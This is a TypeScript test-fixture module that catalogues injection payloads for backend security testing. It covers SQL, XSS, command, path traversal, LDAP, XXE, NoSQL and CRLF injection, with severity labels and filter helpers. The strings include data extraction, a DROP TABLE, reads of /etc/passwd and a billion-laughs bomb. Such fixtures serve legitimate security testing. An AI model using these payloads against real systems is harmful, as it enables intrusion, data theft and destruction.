/**
 * Security Test Payloads
 * Comprehensive collection of injection payloads for testing backend security
 */

export interface SecurityPayload {
  name: string;
  value: string;
  type: 'sql' | 'xss' | 'command' | 'path' | 'ldap' | 'xml' | 'nosql';
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
}

/**
 * SQL Injection Payloads
 * Tests for SQL injection vulnerabilities in backend queries
 */
export const SQL_INJECTION_PAYLOADS: SecurityPayload[] = [
  // Classic SQL Injection
  {
    name: 'Classic OR 1=1',
    value: "' OR '1'='1",
    type: 'sql',
    severity: 'critical',
    description: 'Classic SQL injection to bypass authentication'
  },
  {
    name: 'Union-based SQLi',
    value: "' UNION SELECT NULL, username, password FROM users--",
    type: 'sql',
    severity: 'critical',
    description: 'Union-based SQL injection to extract data'
  },
  {
    name: 'Time-based blind SQLi',
    value: "' OR SLEEP(5)--",
    type: 'sql',
    severity: 'high',
    description: 'Time-based blind SQL injection'
  },
  {
    name: 'Boolean-based blind SQLi',
    value: "' AND 1=1--",
    type: 'sql',
    severity: 'high',
    description: 'Boolean-based blind SQL injection'
  },
  {
    name: 'Stacked queries',
    value: "'; DROP TABLE users;--",
    type: 'sql',
    severity: 'critical',
    description: 'Stacked query injection to drop tables'
  },
  {
    name: 'Comment-based SQLi',
    value: "admin'--",
    type: 'sql',
    severity: 'high',
    description: 'Comment-based SQL injection'
  },
  {
    name: 'Hex encoding SQLi',
    value: "0x61646D696E",
    type: 'sql',
    severity: 'medium',
    description: 'Hex-encoded SQL injection'
  },
  {
    name: 'Error-based SQLi',
    value: "' AND 1=CONVERT(int, (SELECT @@version))--",
    type: 'sql',
    severity: 'high',
    description: 'Error-based SQL injection to extract version'
  },
  {
    name: 'MySQL-specific SQLi',
    value: "' OR 1=1#",
    type: 'sql',
    severity: 'critical',
    description: 'MySQL-specific comment syntax'
  },
  {
    name: 'PostgreSQL-specific SQLi',
    value: "'; SELECT pg_sleep(5)--",
    type: 'sql',
    severity: 'high',
    description: 'PostgreSQL-specific time delay'
  },
];

/**
 * Cross-Site Scripting (XSS) Payloads
 * Tests for XSS vulnerabilities in output rendering
 */
export const XSS_PAYLOADS: SecurityPayload[] = [
  // Basic XSS
  {
    name: 'Basic script tag',
    value: '<script>alert("XSS")</script>',
    type: 'xss',
    severity: 'critical',
    description: 'Basic XSS with script tag'
  },
  {
    name: 'IMG onerror XSS',
    value: '<img src=x onerror=alert("XSS")>',
    type: 'xss',
    severity: 'critical',
    description: 'XSS via image onerror event'
  },
  {
    name: 'SVG-based XSS',
    value: '<svg/onload=alert("XSS")>',
    type: 'xss',
    severity: 'critical',
    description: 'XSS via SVG onload event'
  },
  {
    name: 'Body onload XSS',
    value: '<body onload=alert("XSS")>',
    type: 'xss',
    severity: 'high',
    description: 'XSS via body onload event'
  },
  {
    name: 'JavaScript protocol XSS',
    value: 'javascript:alert("XSS")',
    type: 'xss',
    severity: 'high',
    description: 'XSS via javascript: protocol'
  },
  {
    name: 'Event handler XSS',
    value: '<input onfocus=alert("XSS") autofocus>',
    type: 'xss',
    severity: 'high',
    description: 'XSS via event handler with autofocus'
  },
  {
    name: 'Encoded XSS',
    value: '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    type: 'xss',
    severity: 'medium',
    description: 'HTML-encoded XSS payload'
  },
  {
    name: 'DOM-based XSS',
    value: '"><script>alert(document.domain)</script>',
    type: 'xss',
    severity: 'critical',
    description: 'DOM-based XSS breaking out of attribute'
  },
  {
    name: 'Iframe XSS',
    value: '<iframe src="javascript:alert(\'XSS\')">',
    type: 'xss',
    severity: 'high',
    description: 'XSS via iframe with javascript protocol'
  },
  {
    name: 'Polyglot XSS',
    value: 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    type: 'xss',
    severity: 'critical',
    description: 'Polyglot XSS payload that works in multiple contexts'
  },
];

/**
 * Command Injection Payloads
 * Tests for OS command injection vulnerabilities
 */
export const COMMAND_INJECTION_PAYLOADS: SecurityPayload[] = [
  {
    name: 'Semicolon command chaining',
    value: '; ls -la',
    type: 'command',
    severity: 'critical',
    description: 'Command injection using semicolon'
  },
  {
    name: 'Pipe command chaining',
    value: '| cat /etc/passwd',
    type: 'command',
    severity: 'critical',
    description: 'Command injection using pipe'
  },
  {
    name: 'Ampersand command chaining',
    value: '& whoami &',
    type: 'command',
    severity: 'critical',
    description: 'Command injection using ampersand'
  },
  {
    name: 'Backtick command substitution',
    value: '`id`',
    type: 'command',
    severity: 'high',
    description: 'Command injection using backticks'
  },
  {
    name: 'Dollar command substitution',
    value: '$(whoami)',
    type: 'command',
    severity: 'high',
    description: 'Command injection using $() syntax'
  },
];

/**
 * Path Traversal Payloads
 * Tests for directory traversal vulnerabilities
 */
export const PATH_TRAVERSAL_PAYLOADS: SecurityPayload[] = [
  {
    name: 'Basic path traversal',
    value: '../../../etc/passwd',
    type: 'path',
    severity: 'high',
    description: 'Basic path traversal to access /etc/passwd'
  },
  {
    name: 'Windows path traversal',
    value: '..\\..\\..\\windows\\system32\\config\\sam',
    type: 'path',
    severity: 'high',
    description: 'Windows path traversal'
  },
  {
    name: 'Encoded path traversal',
    value: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    type: 'path',
    severity: 'high',
    description: 'URL-encoded path traversal'
  },
  {
    name: 'Double encoded path traversal',
    value: '%252e%252e%252f%252e%252e%252f',
    type: 'path',
    severity: 'medium',
    description: 'Double URL-encoded path traversal'
  },
  {
    name: 'Null byte injection',
    value: '../../../etc/passwd%00',
    type: 'path',
    severity: 'high',
    description: 'Path traversal with null byte injection'
  },
];

/**
 * LDAP Injection Payloads
 * Tests for LDAP injection vulnerabilities
 */
export const LDAP_INJECTION_PAYLOADS: SecurityPayload[] = [
  {
    name: 'LDAP OR injection',
    value: '*)(uid=*))(|(uid=*',
    type: 'ldap',
    severity: 'high',
    description: 'LDAP injection with OR logic'
  },
  {
    name: 'LDAP wildcard injection',
    value: 'admin*)((|userPassword=*',
    type: 'ldap',
    severity: 'high',
    description: 'LDAP injection using wildcards'
  },
];

/**
 * XML Injection Payloads
 * Tests for XML injection and XXE vulnerabilities
 */
export const XML_INJECTION_PAYLOADS: SecurityPayload[] = [
  {
    name: 'XXE basic',
    value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    type: 'xml',
    severity: 'critical',
    description: 'Basic XXE to read /etc/passwd'
  },
  {
    name: 'XML bomb',
    value: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
    type: 'xml',
    severity: 'high',
    description: 'Billion laughs XML bomb'
  },
];

/**
 * NoSQL Injection Payloads
 * Tests for NoSQL injection vulnerabilities (MongoDB, etc.)
 */
export const NOSQL_INJECTION_PAYLOADS: SecurityPayload[] = [
  {
    name: 'MongoDB $ne operator',
    value: '{"$ne": null}',
    type: 'nosql',
    severity: 'high',
    description: 'NoSQL injection using $ne operator'
  },
  {
    name: 'MongoDB $gt operator',
    value: '{"$gt": ""}',
    type: 'nosql',
    severity: 'high',
    description: 'NoSQL injection using $gt operator'
  },
  {
    name: 'MongoDB $regex',
    value: '{"$regex": ".*"}',
    type: 'nosql',
    severity: 'medium',
    description: 'NoSQL injection using $regex'
  },
];

/**
 * Special Characters and Edge Cases
 * Tests for improper input validation
 */
export const SPECIAL_CHARACTER_PAYLOADS: SecurityPayload[] = [
  {
    name: 'Null bytes',
    value: 'test\x00test',
    type: 'command',
    severity: 'medium',
    description: 'Null byte injection'
  },
  {
    name: 'Unicode bypass',
    value: '\u003Cscript\u003Ealert("XSS")\u003C/script\u003E',
    type: 'xss',
    severity: 'high',
    description: 'Unicode-encoded XSS'
  },
  {
    name: 'Newline injection',
    value: 'test\ninjected\ncommand',
    type: 'command',
    severity: 'medium',
    description: 'Newline character injection'
  },
  {
    name: 'CRLF injection',
    value: 'test\r\nSet-Cookie: admin=true',
    type: 'command',
    severity: 'high',
    description: 'CRLF injection for header manipulation'
  },
];

/**
 * Get all payloads combined
 */
export const ALL_PAYLOADS: SecurityPayload[] = [
  ...SQL_INJECTION_PAYLOADS,
  ...XSS_PAYLOADS,
  ...COMMAND_INJECTION_PAYLOADS,
  ...PATH_TRAVERSAL_PAYLOADS,
  ...LDAP_INJECTION_PAYLOADS,
  ...XML_INJECTION_PAYLOADS,
  ...NOSQL_INJECTION_PAYLOADS,
  ...SPECIAL_CHARACTER_PAYLOADS,
];

/**
 * Get payloads by type
 */
export function getPayloadsByType(type: SecurityPayload['type']): SecurityPayload[] {
  return ALL_PAYLOADS.filter(p => p.type === type);
}

/**
 * Get payloads by severity
 */
export function getPayloadsBySeverity(severity: SecurityPayload['severity']): SecurityPayload[] {
  return ALL_PAYLOADS.filter(p => p.severity === severity);
}

/**
 * Get critical and high severity payloads (for quick testing)
 */
export function getCriticalPayloads(): SecurityPayload[] {
  return ALL_PAYLOADS.filter(p => p.severity === 'critical' || p.severity === 'high');
}
